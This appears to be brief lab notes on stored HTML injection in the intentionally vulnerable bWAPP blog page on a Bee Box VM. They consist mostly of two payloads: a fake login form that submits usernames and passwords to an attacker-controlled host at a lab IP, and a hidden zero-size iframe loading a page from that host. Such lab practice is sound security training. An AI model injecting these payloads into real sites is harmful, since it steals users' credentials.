# Stored HTML injection (Blog)

1. Launch Bee Box VM

2. Go to the bwapp server under HTML Injection Stored (Blog)

3. Insert Payload


## Forms Payload

<form name="login" action="http://192.168.93.135:4444/test.html">
<table>
<tr><td>Username:</td><td><input type="text" name="username"/><td></tr>
<tr><td>Password:</td><td><input type="password" name="password"/><td></tr>
</table>
<input type="submit" value="login"/>
</form>

## iframe

<iframe src="http://192.168.93.135:4444/test.html" height="0" width="0"></iframe>